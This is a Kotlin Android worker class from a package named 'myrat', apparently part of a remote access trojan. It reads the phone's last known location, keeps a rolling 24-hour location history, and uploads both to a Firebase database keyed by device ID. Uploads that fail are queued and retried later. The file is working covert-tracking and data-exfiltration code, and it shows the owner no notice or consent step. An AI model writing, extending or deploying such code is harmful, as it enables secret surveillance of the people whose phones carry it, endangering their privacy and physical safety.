package com.myrat.app.worker

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.android.gms.location.LocationServices
import com.google.firebase.database.FirebaseDatabase
import com.myrat.app.MainActivity
import com.myrat.app.service.LocationService
import com.myrat.app.utils.Logger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext

class LastLocationWorker(appContext: Context, params: WorkerParameters) : CoroutineWorker(appContext, params) {
    private val db = FirebaseDatabase.getInstance().reference
    private val sharedPref = appContext.getSharedPreferences("location_pref", Context.MODE_PRIVATE)
    private val fusedLocationClient = LocationServices.getFusedLocationProviderClient(appContext)

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            // Check location permissions
            if (ActivityCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.ACCESS_FINE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                Logger.log("LastLocationWorker: Location permissions missing")
                return@withContext Result.failure()
            }

            // Get the latest location
            val location = fusedLocationClient.lastLocation.await()
            if (location != null) {
                val timestamp = System.currentTimeMillis()
                val locationData = mapOf(
                    "latitude" to location.latitude,
                    "longitude" to location.longitude,
                    "timestamp" to timestamp,
                    "uploaded" to System.currentTimeMillis()
                )

                // Add to history list
                synchronized(LocationService.history) {
                    LocationService.history.add(locationData)
                    // Cap history at 1000 entries
                    if (LocationService.history.size > 1000) LocationService.history.removeAt(0)
                }

                // Save to SharedPreferences
                sharedPref.edit().apply {
                    putFloat("last_latitude", location.latitude.toFloat())
                    putFloat("last_longitude", location.longitude.toFloat())
                    putLong("last_timestamp", timestamp)
                    apply()
                }

                // Filter history for the last 24 hours
                val recentHistory = synchronized(LocationService.history) {
                    val twentyFourHoursAgo = System.currentTimeMillis() - 24 * 60 * 60 * 1000
                    LocationService.history.removeAll { (it["timestamp"] as? Long ?: 0) < twentyFourHoursAgo }
                    LocationService.history.filter { (it["timestamp"] as? Long ?: 0) >= twentyFourHoursAgo }
                }

                val deviceId = MainActivity.getDeviceId(applicationContext)
                if (hasInternet()) {
                    // Update lastLocation
                    try {
                        db.child("Device").child(deviceId).child("location/lastLocation").setValue(locationData)
                            .addOnFailureListener { e ->
                                Logger.log("LastLocationWorker: Failed to upload last location: ${e.message}")
                            }
                        Logger.log("LastLocationWorker: Last location uploaded: (${location.latitude}, ${location.longitude})")
                    } catch (e: Exception) {
                        Logger.log("LastLocationWorker: Error uploading last location: ${e.message}")
                    }

                    // Update history
                    try {
                        db.child("Device").child(deviceId).child("location/history").setValue(recentHistory)
                            .addOnFailureListener { e ->
                                Logger.log("LastLocationWorker: Failed to upload history: ${e.message}")
                                synchronized(LocationService.pendingHistory) {
                                    LocationService.pendingHistory.add(recentHistory)
                                }
                            }
                        Logger.log("LastLocationWorker: Uploaded history with ${recentHistory.size} locations")
                    } catch (e: Exception) {
                        Logger.log("LastLocationWorker: Error uploading history: ${e.message}")
                        synchronized(LocationService.pendingHistory) {
                            LocationService.pendingHistory.add(recentHistory)
                        }
                    }
                } else {
                    Logger.log("LastLocationWorker: No internet, history and last location saved locally: (${location.latitude}, ${location.longitude})")
                    synchronized(LocationService.pendingHistory) {
                        LocationService.pendingHistory.add(recentHistory)
                    }
                }
                Result.success()
            } else {
                Logger.log("LastLocationWorker: No location available")
                Result.retry()
            }
        } catch (e: Exception) {
            Logger.log("LastLocationWorker: Error: ${e.message}")
            Result.retry()
        }
    }

    private fun hasInternet(): Boolean {
        val connectivityManager = applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        val network = connectivityManager.activeNetwork ?: return false
        val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
        return capabilities.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }
}